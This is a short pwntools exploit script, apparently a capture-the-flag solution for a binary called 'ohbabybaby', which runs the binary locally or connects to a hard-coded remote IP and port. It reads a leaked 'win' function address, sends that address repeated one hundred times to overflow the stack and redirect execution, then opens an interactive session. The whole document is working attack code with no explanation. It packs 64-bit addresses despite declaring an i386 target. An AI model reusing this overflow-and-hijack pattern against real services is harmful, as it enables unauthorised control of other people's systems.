#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./ohbabybaby"
HOST = "185.14.184.242"
PORT = 12990

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

def exploit():
	conn.send("\n\n")
	conn.recvuntil("0x")
	addr_win = int(conn.recvuntil(".")[:-1],16)
	print(hex(addr_win))
	payload = p64(addr_win)*100
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
